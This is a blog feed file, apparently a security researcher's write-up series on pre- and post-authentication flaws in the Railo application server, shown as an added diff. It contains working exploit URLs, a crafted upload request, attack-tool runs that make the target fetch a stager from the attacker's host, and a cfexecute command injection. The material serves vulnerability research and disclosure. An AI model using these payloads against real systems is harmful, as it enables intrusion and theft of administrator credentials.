@@ -1,0 +1,1082 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: clusterd | ]]></title>
+  <link href="http://hatRiot.github.io/blog/categories/clusterd/atom.xml" rel="self"/>
+  <link href="http://hatRiot.github.io/"/>
+  <updated>2018-05-18T09:39:16-07:00</updated>
+  <id>http://hatRiot.github.io/</id>
+  <author>
+    <name><![CDATA[Bryan Alexander]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[railo security - part four - pre-auth remote code execution]]></title>
+    <link href="http://hatRiot.github.io/blog/2014/08/27/railo-security-part-four/"/>
+    <updated>2014-08-27T14:00:00-07:00</updated>
+    <id>http://hatRiot.github.io/blog/2014/08/27/railo-security-part-four</id>
+    <content type="html"><![CDATA[<p><em><a href="http://hatriot.github.io/blog/2014/06/25/railo-security-part-one/">Part one &ndash; intro</a></em><br/>
+<em><a href="http://hatriot.github.io/blog/2014/07/24/railo-security-part-two/">Part two &ndash; post-auth rce</a></em><br/>
+<em><a href="http://hatriot.github.io/blog/2014/08/23/railo-security-part-three">Part three &ndash; pre-auth password retrieval</a></em><br/>
+<em>Part four &ndash; pre-auth remote code execution</em></p>
+
+<p>This post concludes our deep dive into the Railo application server by detailing not only one, but two pre-auth remote code execution vulnerabilities.  If you&rsquo;ve skipped the first three parts of this blog post to get to the juicy stuff, I don&rsquo;t blame you, but I do recommend going back and reading them; there&rsquo;s some important information and details back there.  In this post, we&rsquo;ll be documenting both vulnerabilities from start to finish, along with some demonstrations and notes on clusterd&rsquo;s implementation on one of these.</p>
+
+<p>The first RCE vulnerability affects versions 4.1 and 4.2.x of Railo, 4.2.1 being the latest release.  Our vulnerability begins with the file <code>thumbnail.cfm</code>, which Railo uses to store admin thumbnails as static content on the server.  As previously noted, Railo relies on authentication measures via the cfadmin tag, and thus none of the cfm files actually contain authentication routines themselves.</p>
+
+<p><code>thumbnail.cfm</code> first generates a hash of the image along with it&rsquo;s width and height:</p>
+
+<p><code>
+&lt;cfset url.img=trim(url.img)&gt;
+&lt;cfset id=hash(url.img&amp;"-"&amp;url.width&amp;"-"&amp;url.height)&gt;
+&lt;cfset mimetypes={png:'png',gif:'gif',jpg:'jpeg'}&gt;
+</code></p>
+
+<p>Once it&rsquo;s got a hash, it checks if the file exists, and if not, attempts to read and write it down:</p>
+
+<p>```
+<cffile action="readbinary" file="#url.img#" variable="data">
+<cfimage action="read" source="#data#" name="img"></p>
+
+<!--- shrink images if needed --->
+
+
+<p><cfif img.height GT url.height or img.width GT url.width></p>
+
+<pre><code>&lt;cfif img.height GT url.height &gt;
+    &lt;cfimage action="resize" source="#img#" height="#url.height#" name="img"&gt;
+&lt;/cfif&gt;
+&lt;cfif img.width GT url.width&gt;
+    &lt;cfimage action="resize" source="#img#" width="#url.width#" name="img"&gt;
+&lt;/cfif&gt;
+&lt;cfset data=toBinary(img)&gt;
+</code></pre>
+
+<p></cfif>
+```</p>
+
+<p>The <code>cffile</code> tag is used to read the raw image and then cast it via the <code>cfimage</code> tag.  The wonderful thing about <code>cffile</code> is that we can provide URLs that it will arbitrarily retrieve.  So, our URL can be this:</p>
+
+<p><code>
+192.168.1.219:8888/railo-context/admin/thumbnail.cfm?img=http://192.168.1.97:8000/my_image.png&amp;width=5000&amp;height=50000
+</code></p>
+
+<p>And Railo will go and fetch the image and cast it.  Note that if a height and width are not provided it will attempt to resize it; we don&rsquo;t want this, and thus we provide large width and height values.  This file is written out to <code>/railo/temp/admin-ext-thumbnails/[HASH].[EXTENSION]</code>.</p>
+
+<p>We&rsquo;ve now successfully written a file onto the remote system, and need a way to retrieve it.  The temp folder is not accessible from the web root, so we need some sort of LFI to fetch it.  Enter <code>jsloader.cfc</code>.</p>
+
+<p><code>jsloader.cfc</code> is a Railo component used to fetch and load Javascript files.  In this file is a CF tag called <code>get</code>, which accepts a single argument <code>lib</code>, which the tag will read and return.  We can use this to fetch arbitrary Javascript files on the system and load them onto the page.  Note that it MUST be a Javascript file, as the extension is hard-coded into the file and null bytes don&rsquo;t work here, like they would in PHP.  Here&rsquo;s the relevant code:</p>
+
+<p>```
+<cfset var filePath = expandPath('js/#arguments.lib#.js')/></p>
+
+<pre><code>&lt;cfset var local = {result=""} /&gt;&lt;cfcontent type="text/javascript"&gt;
+    &lt;cfsavecontent variable="local.result"&gt;
+        &lt;cfif fileExists(filePath)&gt;
+            &lt;cfinclude template="js/#arguments.lib#.js"/&gt;
+        &lt;/cfif&gt;
+    &lt;/cfsavecontent&gt;
+&lt;cfreturn local.result /&gt;
+</code></pre>
+
+<p>```</p>
+
+<p>Let&rsquo;s tie all this together.  Using <code>thumbnail.cfm</code>, we can write well-formed images to the file system, and using the <code>jsloader.cfc</code> file, we can read arbitrary Javascript.  Recall how log injection works with PHP; we can inject PHP tags into arbitrary files so long as the file is loaded by PHP, and parsed accordingly.  We can fill a file full of junk, but if the parser has its way a single <code>&lt;?phpinfo();?&gt;</code> will be discovered and executed; the CFML engine works the same way.</p>
+
+<p>Our attack becomes much more clear: we generate a well-formed PNG file, embed CFML code into the image (metadata), set the extension to <code>.js</code>, and write it via <code>thumbnail.cfm</code>.  We then retrieve the file via <code>jsloader.cfc</code> and, because we&rsquo;re loading it with a CFM file, it will be parsed and executed.  Let&rsquo;s check this out:</p>
+
+<p>```
+$ ./clusterd.py -i 192.168.1.219 -a railo -v4.1 &mdash;deploy ./src/lib/resources/cmd.cfml &mdash;deployer jsload</p>
+
+<pre><code>    clusterd/0.3.1 - clustered attack toolkit
+        [Supporting 6 platforms]
+</code></pre>
+
+<p> [2014-06-15 03:39PM] Started at 2014-06-15 03:39PM
+ [2014-06-15 03:39PM] Servers' OS hinted at windows
+ [2014-06-15 03:39PM] Fingerprinting host &lsquo;192.168.1.219&rsquo;
+ [2014-06-15 03:39PM] Server hinted at &lsquo;railo&rsquo;
+ [2014-06-15 03:39PM] Checking railo version 4.1 Railo Server&hellip;
+ [2014-06-15 03:39PM] Checking railo version 4.1 Railo Server Administrator&hellip;
+ [2014-06-15 03:39PM] Checking railo version 4.1 Railo Web Administrator&hellip;
+ [2014-06-15 03:39PM] Matched 2 fingerprints for service railo
+ [2014-06-15 03:39PM]   Railo Server Administrator (version 4.1)
+ [2014-06-15 03:39PM]   Railo Web Administrator (version 4.1)
+ [2014-06-15 03:39PM] Fingerprinting completed.
+ [2014-06-15 03:39PM] This deployer (jsload_lfi) requires an external listening port (8000).  Continue? [Y/n] >
+ [2014-06-15 03:39PM] Preparing to deploy cmd.cfml&hellip;
+ [2014-06-15 03:40PM] Waiting for remote server to download file [5s]]
+ [2014-06-15 03:40PM] Invoking stager and deploying payload&hellip;
+ [2014-06-15 03:40PM] Waiting for remote server to download file [7s]]
+ [2014-06-15 03:40PM] cmd.cfml deployed at /railo-context/cmd.cfml
+ [2014-06-15 03:40PM] Finished at 2014-06-15 03:40PM
+```</p>
+
+<p>A couple things to note; as you may notice, the module currently requires the Railo server to connect back twice.  Once is for the image with embedded CFML, and the second for the payload.  We embed only a stager in the image that then connects back for the actual payload.</p>
+
+<p>Sadly, the LFI was unknowingly killed in 4.2.1 with the following fix to <code>jsloader.cfc</code>:</p>
+
+<p>```
+<cfif arguments.lib CT ".."></p>
+
+<pre><code>&lt;cfheader statuscode="400"&gt;
+&lt;cfreturn "// 400 - Bad Request"&gt;
+</code></pre>
+
+<p></cfif>
+```</p>
+
+<p>The <code>arguments.lib</code> variable contains our controllable path, but it kills our ability to traverse out.  Unfortunately, we can&rsquo;t substitute the .. with unicode or utf-16 due to the way Jetty and Java are configured, by default.  This file is pretty much useless to us now, unless we can write into the folder that <code>jsloader.cfc</code> reads from; then we don&rsquo;t need to traverse out at all.</p>
+
+<p>We can still pop this on Express installs, due to the Jetty LFI discussed in part 3.  By simply traversing into the extensions folder, we can load up the Javascript file and execute our shell.  Railo installs still prove elusive.</p>
+
+<p>buuuuuuuuuuuuuuuuuuuuuuuuut</p>
+
+<p>Recall the <code>img.cfm</code> LFI from part 3; by tip-toeing back into the admin-ext-thumbnails folder, we can summon our vulnerable image and execute whatever coldfusion we shove into it.  This proves to be an even better choice than <code>jsloader.cfc</code>, as we don&rsquo;t need to traverse as far.  This bug only affects versions 4.1 &ndash; 4.2.1, as <code>thumbnail.cfm</code> wasn&rsquo;t added until 4.1.  <code>CVE-2014-5468</code> has been assigned to this issue.</p>
+
+<p>The second RCE vulnerability is a bit easier and has a larger attack vector, spanning all versions of Railo.  As previously noted, Railo does not do per page/URL authentication, but rather enforces it when making changes via the <code>&lt;cfadmin&gt;</code> tag.  Due to this, any pages doing naughty things without checking with the tag may be exploitable, as previously seen.  Another such file is <code>overview.uploadNewLangFile.cfm</code>:</p>
+
+<p>```
+<cfif structKeyExists(form, "newLangFile")></p>
+
+<pre><code>&lt;cftry&gt;
+    &lt;cffile action="UPLOAD" filefield="form.newLangFile" destination="#expandPath('resources/language/')#" nameconflict="ERROR"&gt;
+    &lt;cfcatch&gt;
+        &lt;cfthrow message="#stText.overview.langAlreadyExists#"&gt;
+    &lt;/cfcatch&gt;
+&lt;/cftry&gt;
+&lt;cfset sFile = expandPath("resources/language/" &amp; cffile.serverfile)&gt;
+&lt;cffile action="READ" file="#sFile#" variable="sContent"&gt;
+&lt;cftry&gt;
+    &lt;cfset sXML     = XMLParse(sContent)&gt;
+    &lt;cfset sLang    = sXML.language.XMLAttributes.label&gt;
+    &lt;cfset stInLang = GetFromXMLNode(sXML.XMLRoot.XMLChildren)&gt;
+    &lt;cfcatch&gt;
+        &lt;cfthrow message="#stText.overview.ErrorWhileReadingLangFile#"&gt;
+    &lt;/cfcatch&gt;
+&lt;/cftry&gt;
+</code></pre>
+
+<p>```</p>
+
+<p>I mean, this might as well be an upload form to write arbitrary files.  It&rsquo;s stupid simple to get arbitrary data written to the system:</p>
+
+<p>```
+POST /railo-context/admin/overview.uploadNewLangFile.cfm HTTP/1.1
+Host: localhost:8888
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0 Iceweasel/18.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: <a href="http://localhost:8888/railo-context/admin/server.cfm">http://localhost:8888/railo-context/admin/server.cfm</a>
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=AaB03x
+Content-Length: 140</p>
+
+<p>&mdash;AaB03x
+Content-Disposition: form-data; name=&ldquo;newLangFile&rdquo;; filename=&ldquo;xxxxxxxxx.lang&rdquo;
+Content-Type: text/plain</p>
+
+<p>thisisatest
+&mdash;AaB03x&mdash;
+```</p>
+
+<p>The tricky bit is where it&rsquo;s written to; Railo uses a compression system that dynamically generates compressed versions of the web server, contained within <code>railo-context.ra</code>.  A mirror of these can be found under the following:</p>
+
+<p><code>
+[ROOT]\webapps\ROOT\WEB-INF\railo\temp\compress
+</code></p>
+
+<p>The compressed data is then obfuscated behind two more folders, both MD5s.  In my example, it becomes:</p>
+
+<p><code>
+[ROOT]\webapps\ROOT\WEB-INF\railo\temp\compress\88d817d1b3c2c6d65e50308ef88e579c\0bdbf4d66d61a71378f032ce338258f2
+</code></p>
+
+<p>So we cannot simply traverse into this path, as the hashes change every single time a file is added, removed, or modified.  I&rsquo;ll walk the logic used to generate these, but as a precusor, we aren&rsquo;t going to figure these out without some other fashionable info disclosure bug.</p>
+
+<p>The hashes are calculated in <code>railo-java/railo-core/src/railo/commons/io/res/type/compress/Compress.java</code>:</p>
+
+<p>```
+temp=temp.getRealResource(&ldquo;compress&rdquo;);              <br/>
+temp=temp.getRealResource(MD5.getDigestAsString(cid+&ldquo;&ndash;&rdquo;+ffile.getAbsolutePath()));
+if(!temp.exists())temp.createDirectory(true);
+}
+catch(Throwable t){}
+}</p>
+
+<pre><code>if(temp!=null) {
+    String name=Caster.toString(actLastMod)+":"+Caster.toString(ffile.length());
+    name=MD5.getDigestAsString(name,name);
+    root=temp.getRealResource(name);
+    if(actLastMod&gt;0 &amp;&amp; root.exists()) return;
+</code></pre>
+
+<p>```</p>
+
+<p>The first hash is then <code>cid + "-" + ffile.getAbsolutePath()</code>, where <code>cid</code> is the randomly generated ID found in the <code>id</code> file (see part two) and <code>ffile.getAbsolutePath()</code> is the full path to the classes resource.  This is doable if we have the XXE, but 4.1+ is inaccessible.</p>
+
+<p>The second hash is <code>actLastMode + ":" + ffile.length()</code>, where <code>actLastMode</code> is the last modified time of the file and <code>ffile.length()</code> is the obvious file length.  Again, this is likely not brute forcable without a serious infoleak vulnerability.  Hosts &lt;= 4.0 are exploitable, as we can list files with the XXE via the following:</p>
+
+<p>```
+bryan@debdev:~/tools/clusterd$ python http_test_xxe.py
+88d817d1b3c2c6d65e50308ef88e579c</p>
+
+<p>[SNIP &ndash; in which we modify the path to include ^]</p>
+
+<p>bryan@debdev:~/tools/clusterd$ python http_test_xxe.py
+0bdbf4d66d61a71378f032ce338258f2</p>
+
+<p>[SNIP &ndash; in which we modify the path to include ^]</p>
+
+<p>bryan@debdev:~/tools/clusterd$ python http_test_xxe.py
+admin
+admin_cfc$cf.class
+admin_cfm$cf.class
+application_cfc$cf.class
+application_cfm$cf.class
+component_cfc$cf.class
+component_dump_cfm450$cf.class
+doc
+doc_cfm$cf.class
+form_cfm$cf.class
+gateway
+graph_cfm$cf.class
+jquery_blockui_js_cfm1012$cf.class
+jquery_js_cfm322$cf.class
+META-INF
+railo_applet_cfm270$cf.class
+res
+templates
+wddx_cfm$cf.class
+```</p>
+
+<p><code>http_test_xxe.py</code> is just a small hack I wrote to exploit the XXE, in which we eventually obtain both valid hashes.  So we can exploit this in versions &lt;= 4.0 Express.  Later versions, as far as I can find, have no discernible way of obtaining full RCE without another infoleak or resorting to a slow, loud, painful death of brute forcing two MD5 hashes.</p>
+
+<p>The first RCE is currently available in clusterd dev, and a PR is being made to Metasploit thanks to @BrandonPrry.  Hopefully it can be merged shortly.</p>
+
+<p>As we conclude our Railo analysis, lets quickly recap the vulnerabilities discovered during this audit:</p>
+
+<p>```
+Version 4.2:</p>
+
+<pre><code>- Pre-authentication LFI via `img.cfm` (Install/Express)
+- Pre-authentication LFI via Jetty CVE (Express)
+- Pre-authentication RCE via `img.cfm` and `thumbnail.cfm` (Install/Express)
+- Pre-authentication RCE via `jsloader.cfc` and `thumbnail.cfm` (Install/Express) (Up to version 4.2.0)
+</code></pre>
+
+<p>Version 4.1:</p>
+
+<pre><code>- Pre-authentication LFI via `img.cfm` (Install/Express)
+- Pre-authentication LFI via Jetty CVE (Express)
+- Pre-authentication RCE via `img.cfm` and `thumbnail.cfm` (Install/Express)
+- Pre-authentication RCE via `jsloader.cfc` and `thumbnail.cfm` (Install/Express)
+</code></pre>
+
+<p>Version 4.0:</p>
+
+<pre><code>- Pre-authentication LFI via XXE (Install/Express)
+- Pre-authentication LFI via Jetty CVE (Express)
+- Pre-authentication LFI via `img.cfm` (Install/Express)
+- Pre-authentication RCE via XXE and `overview.uploadNewLangFile` (Install/Express)
+- Pre-authentication RCE via `jsloader.cfc` and `thumbnail.cfm` (Install/Express)
+- Pre-authentication RCE via `img.cfm` and `thumbnail.cfm` (Install/Express)
+</code></pre>
+
+<p>Version 3.x:</p>
+
+<pre><code>- Pre-authentication LFI via `img.cfm` (Install/Express)
+- Pre-authentication LFI via Jetty CVE (Express)
+- Pre-authentication LFI via XXE (Install/Express)
+- Pre-authentication RCE via XXE and `overview.uploadNewLangFile` (Express)
+</code></pre>
+
+<p>```</p>
+
+<p>This does not include the random XSS bugs or post-authentication issues.  At the end of it all, this appears to be a framework with great ideas, but <em>desperately</em> in need of code TLC.  Driving forward with a checklist of features may look nice on a README page, but the desolate wasteland of code left behind can be a scary thing.  Hopefully the Railo guys take note and spend some serious time evaluating and improving existing code.  The bugs found during this series have been disclosed to the developers; here&rsquo;s to hoping they follow through.</p>
+
+<p><img src="/images/posts/2014/railo/railo-getrailo-error.jpg"></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[railo security - part three - pre-authentication LFI]]></title>
+    <link href="http://hatRiot.github.io/blog/2014/08/23/railo-security-part-three/"/>
+    <updated>2014-08-23T14:00:00-07:00</updated>
+    <id>http://hatRiot.github.io/blog/2014/08/23/railo-security-part-three</id>
+    <content type="html"><![CDATA[<p><em><a href="http://hatriot.github.io/blog/2014/06/25/railo-security-part-one/">Part one &ndash; intro</a></em><br/>
+<em><a href="http://hatriot.github.io/blog/2014/07/24/railo-security-part-two/">Part two &ndash; post-authentication rce</a></em><br/>
+<em>Part three &ndash; pre-authentication LFI</em><br/>
+<em><a href="http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/">Part four &ndash; pre-authentication rce</a></em></p>
+
+<p>This post continues our four part Railo security analysis with three pre-authentication LFI vulnerabilities.  These allow anonymous users access to retrieve the administrative plaintext password and login to the server&rsquo;s administrative interfaces.  If you&rsquo;re unfamiliar with Railo, I recommend at the very least reading part one of this series.  The most significant LFI discussed has been implemented as auxiliary modules in <a href="http://github.com/hatRiot/clusterd">clusterd</a>, though they&rsquo;re pretty trivial to exploit on their own.</p>
+
+<p>We&rsquo;ll kick this portion off by introducing a pre-authentication LFI vulnerability that affects all versions of Railo Express; if you&rsquo;re unfamiliar with the Express install, it&rsquo;s really just a self-contained, no-installation-necessary package that harnesses Jetty to host the service.   The flaw actually has nothing to do with Railo itself, but rather in this packaged web server, Jetty.  <a href="http://www.cvedetails.com/cve/CVE-2007-6672/">CVE-2007-6672</a> addresses this issue, but it appears that the Railo folks have not bothered to update this.  Via the browser, we can pull the config file, complete with the admin hash, with <code>http://[host]:8888/railo-context/admin/..\..\railo-web.xml.cfm</code>.</p>
+
+<p>A quick run of this in clusterd on Railo 4.0:</p>
+
+<p>```
+$ ./clusterd.py -i 192.168.1.219 -a railo -v4.0 &mdash;rl-pw</p>
+
+<pre><code>    clusterd/0.3 - clustered attack toolkit
+        [Supporting 6 platforms]
+</code></pre>
+
+<p> [2014-05-15 06:25PM] Started at 2014-05-15 06:25PM
+ [2014-05-15 06:25PM] Servers' OS hinted at windows
+ [2014-05-15 06:25PM] Fingerprinting host &lsquo;192.168.1.219&rsquo;
+ [2014-05-15 06:25PM] Server hinted at &lsquo;railo&rsquo;
+ [2014-05-15 06:25PM] Checking railo version 4.0 Railo Server&hellip;
+ [2014-05-15 06:25PM] Checking railo version 4.0 Railo Server Administrator&hellip;
+ [2014-05-15 06:25PM] Checking railo version 4.0 Railo Web Administrator&hellip;
+ [2014-05-15 06:25PM] Matched 3 fingerprints for service railo
+ [2014-05-15 06:25PM]   Railo Server (version 4.0)
+ [2014-05-15 06:25PM]   Railo Server Administrator (version 4.0)
+ [2014-05-15 06:25PM]   Railo Web Administrator (version 4.0)
+ [2014-05-15 06:25PM] Fingerprinting completed.
+ [2014-05-15 06:25PM] Attempting to pull password&hellip;
+ [2014-05-15 06:25PM] Fetched encrypted password, decrypting&hellip;
+ [2014-05-15 06:25PM] Decrypted password: default
+ [2014-05-15 06:25PM] Finished at 2014-05-15 06:25PM
+```</p>
+
+<p>and on the latest release of Railo, 4.2:</p>
+
+<p>```
+$ ./clusterd.py -i 192.168.1.219 -a railo -v4.2 &mdash;rl-pw</p>
+
+<pre><code>    clusterd/0.3 - clustered attack toolkit
+        [Supporting 6 platforms]
+</code></pre>
+
+<p> [2014-05-15 06:28PM] Started at 2014-05-15 06:28PM
+ [2014-05-15 06:28PM] Servers' OS hinted at windows
+ [2014-05-15 06:28PM] Fingerprinting host &lsquo;192.168.1.219&rsquo;
+ [2014-05-15 06:28PM] Server hinted at &lsquo;railo&rsquo;
+ [2014-05-15 06:28PM] Checking railo version 4.2 Railo Server&hellip;
+ [2014-05-15 06:28PM] Checking railo version 4.2 Railo Server Administrator&hellip;
+ [2014-05-15 06:28PM] Checking railo version 4.2 Railo Web Administrator&hellip;
+ [2014-05-15 06:28PM] Matched 3 fingerprints for service railo
+ [2014-05-15 06:28PM]   Railo Server (version 4.2)
+ [2014-05-15 06:28PM]   Railo Server Administrator (version 4.2)
+ [2014-05-15 06:28PM]   Railo Web Administrator (version 4.2)
+ [2014-05-15 06:28PM] Fingerprinting completed.
+ [2014-05-15 06:28PM] Attempting to pull password&hellip;
+ [2014-05-15 06:28PM] Fetched password hash: d34535cb71909c4821babec3396474d35a978948455a3284fd4e1bc9c547f58b
+ [2014-05-15 06:28PM] Finished at 2014-05-15 06:28PM
+```</p>
+
+<p>Using this LFI, we can pull the <code>railo-web.xml.cfm</code> file, which contains the administrative password.  Notice that 4.2 only dumps a hash, whilst 4.0 dumps a plaintext password.  This is because versions &lt;= 4.0 blowfish encrypt the password, and > 4.0 actually hashes it.  Here&rsquo;s the relevant code from Railo (ConfigWebFactory.java):</p>
+
+<p>```
+private static void loadRailoConfig(ConfigServerImpl configServer, ConfigImpl config, Document doc) throws IOException  {</p>
+
+<pre><code>    Element railoConfiguration = doc.getDocumentElement();
+
+    // password
+    String hpw=railoConfiguration.getAttribute("pw");
+    if(StringUtil.isEmpty(hpw)) {
+        // old password type
+        String pwEnc = railoConfiguration.getAttribute("password"); // encrypted password (reversable)
+        if (!StringUtil.isEmpty(pwEnc)) {
+            String pwDec = new BlowfishEasy("tpwisgh").decryptString(pwEnc);
+            hpw=hash(pwDec);
+        }
+    }
+    if(!StringUtil.isEmpty(hpw))
+        config.setPassword(hpw);
+    else if (configServer != null) {
+        config.setPassword(configServer.getDefaultPassword());
+    }
+</code></pre>
+
+<p>```</p>
+
+<p>As above, they actually encrypted the password using a hard-coded symmetric key; this is where versions &lt;= 4.0 stop.  In > 4.0, after decryption they hash the password (SHA256) and use it as such.  Note that the encryption/decryption is no longer the actual password in > 4.0, so we cannot simply decrypt the value to use and abuse.</p>
+
+<p>Due to the configuration of the web server, we can only pull CFM files; this is fine for the configuration file, but system files prove troublesome&hellip;</p>
+
+<p><img class="<a" src="href="http://diyblogger.net/wp-content/uploads/2010/12/billy-mays.jpg">http://diyblogger.net/wp-content/uploads/2010/12/billy-mays.jpg</a>"></p>
+
+<p>The second LFI is a trivial XXE that affects versions &lt;= 4.0, and is exploitable out-of-the-box with Metasploit.  Unlike the Jetty LFI, this affects all versions of Railo, both installed and express:</p>
+
+<p><img src="/images/posts/2014/railo/railo-xxe-msf.jpg"></p>
+
+<p>Using this we cannot pull <code>railo-web.xml.cfm</code> due to it containing XML headers, and we cannot use the standard OOB methods for retrieving files.  Timothy Morgan gave a great <a href="http://2013.appsecusa.org/2013/wp-content/uploads/2013/12/WhatYouDidntKnowAboutXXEAttacks.pdf">talk</a> at OWASP Appsec 2013 that detailed a neat way of abusing Java XML parsers to obtain RCE via XXE.  The process is pretty interesting; if you submit a URL with a jar:// protocol handler, the server will download the zip/jar to a temporary location, perform some header parsing, and then delete it.  However, if you push the file and leave the connection open, the file will persist.  This vector, combined with one of the other LFI&rsquo;s, could be a reliable pre-authentication RCE, but I was unable to get it working.</p>
+
+<p>The third LFI is just as trivial as the first two, and again stems from the pandemic problem of failing to authenticate at the URL/page level.  <code>img.cfm</code> is a file used to, you guessed it, pull images from the system for display.  Unfortunately, it fails to sanitize anything:</p>
+
+<p>```
+<cfset path="resources/img/#attributes.src#.cfm">
+<cfparam name="application.adminimages" default="#{}#">
+<cfif StructKeyExists(application.adminimages,path) and false></p>
+
+<pre><code>&lt;cfset str=application.adminimages[path]&gt;
+</code></pre>
+
+<p><cfelse></p>
+
+<pre><code>&lt;cfsavecontent variable="str" trim&gt;&lt;cfinclude template="#path#"&gt;&lt;/cfsavecontent&gt;
+&lt;cfset application.adminimages[path]=str&gt;
+</code></pre>
+
+<p></cfif>
+```</p>
+
+<p>By fetching this page with <code>attributes.src</code> set to another CFM file off elsewhere, we can load the file and execute any tags contained therein.  As we&rsquo;ve done above, lets grab <code>railo-web.xml.cfm</code>; we can do this with the following url: <code>http://host:8888/railo-context/admin/img.cfm?attributes.src=../../../../railo-web.xml&amp;thistag.executionmode=start</code> which simply returns</p>
+
+<p><code>
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;railo-configuration pw="d34535cb71909c4821babec3396474d35a978948455a3284fd4e1bc9c547f58b" version="4.2"&gt;
+</code></p>
+
+<p>This vulnerability exists in 3.3 &ndash; 4.2.1 (latest), and is exploitable out-of-the-box on both Railo installed and Express editions.  Though you can only pull CFM files, the configuration file dumps plenty of juicy information.  It may also be beneficial for custom tags, plugins, and custom applications that may house other vulnerable/sensitive information hidden away from the URL.</p>
+
+<p>Curiously, at first glance it looks like it may be possible to turn this LFI into an RFI.  Unfortunately it&rsquo;s not quite that simple; if we attempt to access a non-existent file, we see the following:</p>
+
+<p><code>
+The error occurred in zip://C:\Documents and Settings\bryan\My Documents\Downloads\railo\railo-express-4.2.1.000-jre-win32\webapps\ROOT\WEB-INF\railo\context\railo-context.ra!/admin/img.cfm: line 29
+</code></p>
+
+<p>Notice the <code>zip://</code> handler.  This prevents us from injecting a path to a remote host with any other handler.  If, however, the tag looked like this:</p>
+
+<p><code>
+&lt;cfinclude&gt;#attributes.src#&lt;/cfinclude&gt;
+</code></p>
+
+<p>Then it would have been trivially exploitable via RFI.  As it stands, it&rsquo;s not possible to modify the handler without prior code execution.</p>
+
+<p>To sum up the LFI&rsquo;s: all versions and all installs are vulnerable via the <code>img.cfm</code> vector.  All versions and all express editions are vulnerable via the Jetty LFI.  Versions &lt;= 4.0 and all installs are vulnerable to the XXE vector.  This gives us reliable LFI in all current versions of Railo.</p>
+
+<p>This concludes our pre-authentication LFI portion of this assessment, which will crescendo with our final post detailing several pre-authentication RCE vulnerabilities.  I expect a quick turnaround for part four, and hope to have it out in a few days.  Stay tuned!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[railo security - part two - post-authentication rce]]></title>
+    <link href="http://hatRiot.github.io/blog/2014/07/24/railo-security-part-two/"/>
+    <updated>2014-07-24T14:10:04-07:00</updated>
+    <id>http://hatRiot.github.io/blog/2014/07/24/railo-security-part-two</id>
+    <content type="html"><![CDATA[<p><em><a href="http://hatriot.github.io/blog/2014/06/25/railo-security-part-one/">Part one &ndash; intro</a></em><br/>
+<em>Part two &ndash; post-authentication rce</em><br/>
+<em><a href="http://hatriot.github.io/blog/2014/08/23/railo-security-part-three/">Part three &ndash; pre-authentication lfi</a></em><br/>
+<em><a href="http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/">Part four &ndash; pre-authentication rce</a></em></p>
+
+<p>This post continues our dive into Railo security, this time introducing several post-authentication RCE vulnerabilities discovered in the platform.  As stated in part one of this series, like ColdFusion, there is a task scheduler that allows authenticated users the ability to write local files.  Whilst the existence of this feature sets it as the standard way to shell a Railo box, sometimes this may not work.  For example, in the event of stringent firewall rules, or irregular file permissions, or you&rsquo;d just prefer not to make remote connections, the techniques explored in this post will aid you in this manner.</p>
+
+<p>PHP has an interesting, ahem, <em>feature</em>, where it writes out session information to a temporary file located in a designated path (<a href="http://ar.php.net/manual/en/session.configuration.php">more</a>).  If accessible to an attacker, this file can be used to inject PHP data into, via multiple different vectors such as a User-Agent or some function of the application itself.  Railo does sort of the same thing for its Web and Server interfaces, except these files are always stored in a predictable location.  Unlike PHP however, the name of the file is not simply the session ID, but is rather a quasi-unique value generated using a mixture of pseudo-random and predictable/leaked information.  I&rsquo;ll dive into this here in a bit.</p>
+
+<p>When a change to the interface is made, or a new page bookmark is created, Railo writes this information out to a session file located at <code>/admin/userdata/</code>.  The file is then either created, or an existing one is used, and will be named either <code>web-[value].cfm</code> or <code>server-[value].cfm</code> depending on the interface you&rsquo;re coming in from.  It&rsquo;s important to note the extension on these files; because of the CFM extension, these files will be parsed by the CFML interpreter looking for CF tags, much like PHP will do.  A typical request to add a new bookmark is as follows:</p>
+
+<p><code>
+GET /railo-context/admin/web.cfm?action=internal.savedata&amp;action2=addfavorite&amp;favorite=server.request HTTP/1.1
+</code></p>
+
+<p>The favorite <code>server.request</code> is then written out to a JSON-encoded array object in the session file, as below:</p>
+
+<p><code>
+{'fullscreen':'true','contentwidth':'1267','favorites':{'server.request':''}}
+</code></p>
+
+<p>The next question is then obvious: what if we inject something malicious as a favorite?</p>
+
+<p><code>
+GET /railo-context/admin/web.cfm?action=internal.savedata&amp;action2=addfavorite&amp;favorite=&lt;cfoutput&gt;&lt;cfexecute name="c:\windows\system32\cmd.exe" arguments="/c dir" timeout="10" variable="output"&gt;&lt;/cfexecute&gt;&lt;pre&gt;#output#&lt;/pre&gt;&lt;/cfoutput&gt; HTTP/1.1
+</code></p>
+
+<p>Our session file will then read:</p>
+
+<p><code>
+{'fullscreen':'true','contentwidth':'1267','favorites':{'&lt;cfoutput&gt;&lt;cfexecute name="c:\windows\system32\cmd.exe" arguments="/c dir" timeout="10" variable="output"&gt;&lt;/cfexecute&gt;&lt;pre&gt;##output##&lt;/pre&gt;&lt;/cfoutput&gt;':'','server.charset':''}}
+</code></p>
+
+<p>Whilst our injected data is written to the file, astute readers will note the double # around our Coldfusion variable.  This is ColdFusion&rsquo;s way of escaping a number sign, and will therefore not reflect our command output back into the page.  To my knowledge, there is no way to obtain shell output without the use of the variable tags.</p>
+
+<p>We have two options for popping this: inject a command to return a shell or inject a web shell that simply writes output to a file that is then accessible from the web root.  I&rsquo;ll start with the easiest of the two, which is injecting a command to return a shell.</p>
+
+<p>I&rsquo;ll use PowerSploit&rsquo;s Invoke-Shellcode script and inject a Meterpreter shell into the Railo process.  Because Railo will also quote our single/double quotes, we need to base64 the Invoke-Expression payload:</p>
+
+<p><code>
